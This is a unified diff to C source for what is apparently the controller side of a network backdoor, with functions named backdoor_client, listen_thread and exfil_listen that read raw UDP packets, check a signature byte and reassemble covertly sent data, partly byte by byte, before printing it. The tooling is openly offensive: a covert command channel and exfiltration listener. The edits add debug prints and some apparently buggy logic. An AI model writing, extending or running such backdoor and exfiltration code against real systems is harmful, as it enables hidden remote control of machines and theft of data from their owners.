@@ -103,8 +103,8 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 void *listen_thread(void *arg)
 {
 	int sock;
-	char buf[MAX_LEN];
-	int buf_len = 0;
+	static char buf[MAX_LEN];
+	static int buf_len = 0;
 	uint32 ipaddr = *(uint32*)arg;
 
 	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
@@ -135,25 +135,34 @@ void *listen_thread(void *arg)
 		// Step 2: check for signature
 
 		// Step 3: dump data into buffer
-		ptr = (char *)(packet + IP_UDP_LEN);
+		ptr = (char *)(packet + IP_LEN);
+
+		if (*ptr == SIGNTR)
+			return;
+
+		++ptr;
+
 //		dec = decrypt(SEKRET, ptr, FRAM_SZ);
 		data = buf + buf_len;
-		memcpy(data, ptr, FRAM_SZ);
+		memcpy(data, ptr, 1);
 //		free(dec);
 
-		buf_len += pack_len - IP_UDP_LEN;
+		buf_len += 1;
 
 		// Step 4: see if we have a full transmission
 		data = getTransmission(buf, &buf_len, &type);
 		if (data == NULL)
 			continue;
 
+		printf("Hi\n");
+
 		// Step 5: show the results
 		if (type == RSP_TYP)
-			printf("%s", data);
+			printf("Data: %s", data);
 
 		// Step 6: reset buffer
 		memset(buf, 0, MAX_LEN);
+		memset(packet, 0, MAX_LEN);
 		buf_len = 0;
 		free(data);
 		data = 0;
@@ -205,13 +214,13 @@ void* exfil_listen(void *arg)
 		// Step 2: check for signature
 
 		// Step 3: dump data into buffer
-		ptr = (char *)(packet + IP_UDP_LEN);
+		ptr = (char *)(packet + IP_LEN);
 //		dec = decrypt(SEKRET, ptr, FRAM_SZ);
 		data = buf + buf_len;
 		memcpy(data, ptr, FRAM_SZ);
 //		free(dec);
 
-		buf_len += pack_len - IP_UDP_LEN;
+		buf_len += pack_len - IP_LEN;
 
 		// Step 4: see if we have a full transmission
 		data = getTransmission(buf, &buf_len, &type);
